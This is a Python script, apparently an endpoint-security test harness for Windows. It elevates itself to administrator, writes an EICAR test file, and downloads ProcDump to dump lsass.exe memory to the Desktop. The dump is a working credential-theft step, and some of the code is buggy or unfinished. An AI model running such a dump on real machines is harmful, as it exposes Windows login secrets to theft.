import subprocess as sp
from time import sleep
import os
from zipfile import ZipFile
import shutil
import sys
import ctypes
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

colorama_init()


def is_admin():
    """Returns True if script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Relaunch the script with admin privileges and keep the output visible."""
    script = os.path.abspath(sys.argv[0])  # Get absolute path of the script
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])  # Properly format arguments
    python_exe = sys.executable  # Gets the correct Python interpreter

    # Relaunch using cmd.exe so the window stays open
    cmd = f'start cmd /k "{python_exe} \"{script}\" {params}"'
    
    # Use ShellExecute to elevate privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 1)
    
    sys.exit()

if not is_admin():
    print(f"{Fore.RED}[!]{Style.RESET_ALL} Relaunching as {Fore.RED}Admin{Style.RESET_ALL}...\n")
    run_as_admin()

print(f"{Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} Running with {Fore.RED}Administrator{Style.RESET_ALL} privileges...\n")

#CS_PATH = r"C:\Windows\System32\drivers\CrowdStrike"


class EPScenario:
    def __init__(self, ps, path):
        self.PS = ps
        self.path = path
    
    def make_Eicar(self):
        """ 
        Generate EICAR file on user Desktop
        """

        eicar_file = os.path.join(f"{self.path}", "EICAR.txt")
        try:

            os.chdir(f"{self.path}")
                # EICAR file not recognized as malicious by Windows? May need to execute file.
                # Need to test on lab endpoint

            with open(eicar_file, "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            files = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]
            if files:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} File created: EICAR.txt!\n\n")
            

        except FileNotFoundError as e:
            print("{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
            path = input(f"{Fore.RED}[*]{Style.RESET_ALL} Enter path manually:\n")
            os.chdir(path=path)

            with open(eicar_file, "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    def cs_alerts(self):
        sp.check_output(["cmd.exe", "-Command", ])
        # Generate CrowdStrike alerts via cmd in proj-notes.txt
        pass

    def _dump_setup(self):
        """
        Make relevant directories -> easier cleanup
        """

        os.makedirs(self.path + "ProcDump", exist_ok=True)
        os.makedirs(self.path + "Dump", exist_ok=True)

        return self.path + "ProcDump"

    
    def _check_cleaned(self):
        """
         Checks if files were deleted after calling dump_lsass method.
        """

        # Collect matching filenames
        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "dump" in f.lower()]
    
        
        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False
        
        sf_file = False
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file):  
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                        sf_dir = True
                    elif os.path.isfile(file):  
                        os.remove(file)  # Delete file
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                        sf_file = True
                except PermissionError as e:
                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
        else:
            return True
    
    def dump_lsass(self):

        path = self._dump_setup() # Path-To-Desktop\\ProcDump
        procZip = "Procdump.zip"

        # Download Procdump
        sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.path}Procdump.zip"""] ,shell=True, text=True)
        joined_path = self.path+procZip

        # Unzip file
        with ZipFile(joined_path, "r") as procObject:
            procObject.extractall(path=path)

        sleep(2)

        # Run command
        try:    
            args = f'"{path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
            sp.run(["cmd.exe", "/c", args], shell=True, text=True)

        # Handle error
        except PermissionError as e:
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Initialized ProcDump in Dump directory!\n")
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump..\nStarting cleanup.....\n")

            cleaned_success = self._check_cleaned()

            if cleaned_success:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Cleaning done!\n")
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")


    def _check_S_solutions(self):
        # Check whether Cisco AMP, Symantec, or CrowdStrike is present on the EP.
        pass

    def download_files(self):
        # Based on the previous function, define ways to extract said files mentioned in notes.
        pass

    def surf_limits(self):
        # Check default browser, 
        pass


if __name__ == '__main__':
    PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
    
    desktopPath = os.path.expandvars(r"%USERPROFILE%\Desktop\\")
    EP_obj = EPScenario(ps=PS, path=desktopPath)
    EP_obj.make_Eicar()
    EP_obj.dump_lsass()

    if input("Press any key to exit...\n"):
        sys.exit(0)